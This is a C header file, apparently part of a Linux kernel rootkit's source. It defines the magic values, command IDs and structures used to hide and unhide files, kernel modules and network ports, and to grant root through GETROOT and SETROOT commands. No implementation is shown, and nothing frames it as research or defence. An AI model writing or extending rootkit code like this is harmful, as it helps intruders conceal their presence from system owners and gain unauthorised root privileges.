#ifndef __ROOTKIT_H
#define __ROOTKIT_H

#define MAX_CLOAK_FILE_COUNT 16
#define MAX_CLOAK_FILE_NAME_LEN 16
#define MAX_CLOAK_MOD_COUNT 16
#define MAX_CLOAK_MOD_NAME_LEN 16
#define MAX_CLOAK_PORT_COUNT 16
#define ROOTKIT_IOCTL_MAGIC 0x20000125
#define ROOTKIT_CMD_MAGIC_HEAD 0x20000126
#define ROOTKIT_CMD_MAGIC_TAIL 0x20000127
#define ROOTKIT_CMD_ID_HIDEFILE 0x20000128
#define ROOTKIT_CMD_ID_GETROOT 0x20000129
#define ROOTKIT_CMD_ID_TEST 0x2000012a
#define ROOTKIT_CMD_ID_HIDEMOD 0x2000012d
#define ROOTKIT_CMD_ID_SHOWMOD 0x2000012e
#define ROOTKIT_CMD_ID_HIDEPORT 0x2000012f
#define ROOTKIT_CMD_ID_SHOWPORT 0x20000130
#define ROOTKIT_CMD_ID_SHOWFILE 0x20000131
#define ROOTKIT_CMD_ID_SETROOT 0x20000132

struct rootkit_cmd{
    unsigned long magic_head;
    unsigned long cmd_id;
    void* real_arg;
    unsigned long magic_tail;
};

struct cloak_file_cmd{
    char name[MAX_CLOAK_FILE_NAME_LEN];
};

struct cloak_mod_cmd{
    char name[MAX_CLOAK_MOD_NAME_LEN];
};


#endif
